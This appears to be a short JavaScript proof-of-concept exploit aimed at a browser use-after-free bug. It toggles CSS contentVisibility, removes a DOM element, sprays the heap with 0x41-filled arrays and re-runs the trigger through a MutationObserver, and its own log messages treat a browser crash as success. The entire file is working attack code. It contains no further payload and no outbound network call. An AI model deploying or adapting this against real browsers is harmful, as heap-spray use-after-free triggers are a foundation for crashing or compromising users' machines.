import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
const child = document.querySelector(".child");

function heapSpray() {
  let spray = [];
  for (let i = 0; i < 10000; i++) {
    let arr = new Uint8Array(0x1000);
    for (let j = 0; j < arr.length; j++) {
      arr[j] = 0x41;
    }
    spray.push(arr);
  }
  return spray;
}

export function triggerUAF() {
  debug_log("Triggering UAF (start)");
  container.style.contentVisibility = "hidden";
  child.remove();
  setTimeout(() => {
    container.style.contentVisibility = "auto";
    let spray = heapSpray();
    debug_log("Triggering UAF (end) — If you see this, the code ran to completion. If the browser crashes, the UAF triggered.");
  }, 0);
}

const observer = new MutationObserver(() => {
  debug_log("DOM tree modified, attempting UAF...");
  triggerUAF();
});

observer.observe(container, { childList: true, subtree: true });
